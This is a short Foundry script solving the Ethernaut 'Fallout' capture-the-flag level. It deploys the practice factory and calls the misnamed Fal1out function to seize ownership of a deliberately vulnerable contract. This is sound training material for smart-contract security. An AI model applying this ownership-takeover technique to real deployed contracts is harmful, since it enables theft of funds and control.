// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallout} from "../src/2-Fallout.sol";
import {FalloutFactory} from "../src/FalloutFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract FalloutSolution is Script {
    Fallout public falloutLevel;

    function run() external {
        address publicKey = vm.envAddress("PUBLIC_KEY");

        FalloutFactory falloutFact = new FalloutFactory();
        address payable instanceAddress = payable(
            falloutFact.createInstance(publicKey)
        );

        // address payable instanceAddress = payable(
        //     0x365B4ae473CdFabf4a2752ebe2E285ADCc3eD382
        // );

        falloutLevel = Fallout(instanceAddress);
        console.log("Initial Owner: %s", falloutLevel.owner());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        falloutLevel.Fal1out{value: 1 wei}();

        vm.stopBroadcast();

        bool isValidated = falloutFact.validateInstance(
            instanceAddress,
            publicKey
        );

        console.log("Challenge Completed: %s", isValidated);
    }
}
